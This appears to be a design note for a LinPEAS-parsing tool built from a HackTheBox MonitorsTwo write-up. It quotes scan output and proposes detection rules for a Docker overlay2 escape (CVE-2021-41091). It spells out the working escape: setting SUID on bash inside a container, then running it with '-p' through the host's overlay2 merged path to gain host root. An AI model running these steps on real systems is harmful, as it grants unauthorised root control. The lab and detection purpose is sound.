# HTB MonitorsTwo: Real LinPEAS Container Section + Docker Breakout (CVE-2021-41091)

**Platform:** HackTheBox
**Machine:** MonitorsTwo
**Source:** Hardsoft Security writeup (Spanish site, hardsoft-security blog)
**Year:** 2023
**Category:** Docker/Moby breakout via world-readable container mount point,
distinct from docker_sock (socket access) and docker_group (group membership): this is exploiting a HOST-SIDE overlay2 directory that is readable/executable
from OUTSIDE the container due to CVE-2021-41091.

## Why this matters for ReadPEAS
This is genuinely different from existing docker_sock/docker_group coverage:
the attacker is ALREADY root INSIDE a container (via `chmod u+s /bin/bash`
executed as container-root), and the escape vector is finding the container's
own overlay2 merged directory mounted on the HOST filesystem, then executing
a SUID binary from inside that host-visible path.

## Real LinPEAS Container Detection Output (verbatim)
```
                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present (if any):
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... docker
═╣ Any running containers? ........ No
╔══════════╣ Docker Container details
═╣ Am I inside Docker group ....... No
═╣ Looking and enumerating Docker Sockets (if any):
═╣ Docker version ................. Not Found
═╣ Vulnerable to CVE-2019-5736 .... Not Found
═╣ Vulnerable to CVE-2019-13139 ... Not Found
═╣ Rootless Docker? ............... No

╔══════════╣ Container & breakout enumeration
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout
═╣ Container ID ................... 50bca5e748b0
═╣ Container Full ID .............. 50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e
═╣ Seccomp enabled? ............... enabled
═╣ AppArmor profile? .............. docker-default (enforce)
═╣ User proc namespace? ........... enabled         0          0 4294967295
═╣ Vulnerable to CVE-2019-5021 .... No
```

## Interesting Files Mounted (verbatim, key line highlighted)
```
╔══════════╣ Interesting Files Mounted
overlay on / type overlay (rw,relatime,lowerdir=...,upperdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff,workdir=...)
...
**/dev/sda2 on /entrypoint.sh type ext4 (rw,relatime)
/dev/sda2 on /etc/resolv.conf type ext4 (rw,relatime)
/dev/sda2 on /etc/hostname type ext4 (rw,relatime)
/dev/sda2 on /etc/hosts type ext4 (rw,relatime)**
```
The `/dev/sda2` mounts for `/entrypoint.sh`, `/etc/resolv.conf`, `/etc/hostname`,
`/etc/hosts` reveal that the SAME underlying host block device backs both the
container and the host: meaning the container's overlay2 `upperdir` path
(`/var/lib/docker/overlay2/<container-id>/diff`) is a real, navigable directory
on the HOST filesystem, reachable once you have a foothold on the host as any
user (even unprivileged), because that overlay path is typically world-readable.

## Container Capabilities (verbatim)
```
╔══════════╣ Container Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#capabilities-abuse-escape

Current: cap_chown,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write,cap_setfcap=eip
```

## SUID Section (verbatim: capsh finding is a RED HERRING here)
```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
strace Not Found
-rwsr-xr-x 1 root root 87K Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 63K Feb  7  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 52K Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 58K Feb  7  2020 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Feb  7  2020 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 31K Oct 14  2020 /sbin/capsh
-rwsr-xr-x 1 root root 55K Jan 20  2022 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 35K Jan 20  2022 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Jan 20  2022 /bin/su
```
`/sbin/capsh` is a KNOWN GTFOBins SUID entry, and it IS tried:
```
/sbin/capsh --gid=0 --uid=0 --
```
**But this does NOT work**: the writeup explicitly notes: "this isn't the way
to break out of the container." This is a genuine documented false-positive-
in-practice case worth encoding: capsh SUID escalation gives root INSIDE the
container, which the attacker already had (it's a container, root inside is
not the goal: host breakout is).

## The actual working exploit chain
Step 1: get SUID bash inside the container (already root there):
```
chmod u+s /bin/bash
```
Step 2: from a HOST-level low-priv shell (obtained separately via SSH as
user `marcus`, found via cracking a MySQL password hash from the `cacti`
database), locate the container's overlay merged directory:
```
findmnt
```
Look for lines like:
```
└─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
                                      overlay     overlay     rw,relatime,lowerdir=...
```
Step 3: the SUID bash created in Step 1 (inside the container) is now
visible and executable from the HOST via that merged path:
```
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
```
Result:
```
bash-5.1# whoami
root
```

## Detection Pattern for ReadPEAS
This is a two-context vulnerability (container + host) that existing
docker_sock/docker_group modules do not cover:

1. In container-context LinPEAS output: match `"Is this a container? ........... docker"`
   combined with mount output showing the same host block device
   (`/dev/sdaX`) backing multiple container paths (`/entrypoint.sh`,
   `/etc/resolv.conf`, etc.): this indicates overlay2 storage driver on a
   shared host filesystem, meaning the container's upperdir is host-reachable.
2. When later running LinPEAS from a HOST shell (different user, different
   session), check `findmnt` / mount output for
   `/var/lib/docker/overlay2/<hash>/merged` paths: flag any such path as a
   potential container-escape pivot if a SUID binary was (or can be) planted
   inside the corresponding container.
3. This requires correlating TWO separate LinPEAS runs (once as container
   root, once as host user): a capability ReadPEAS doesn't currently model.
   Consider a new module `docker_overlay_escape` that:
   - Flags container LinPEAS runs where `/entrypoint.sh` or similar app
     files are mounted from a real host block device (not tmpfs/overlay-only)
   - Flags host LinPEAS runs showing readable/writable
     `/var/lib/docker/overlay2/*/merged` paths as HIGH: "if a SUID binary
     exists in a running container's filesystem, it is reachable here on
     the host without needing docker exec"
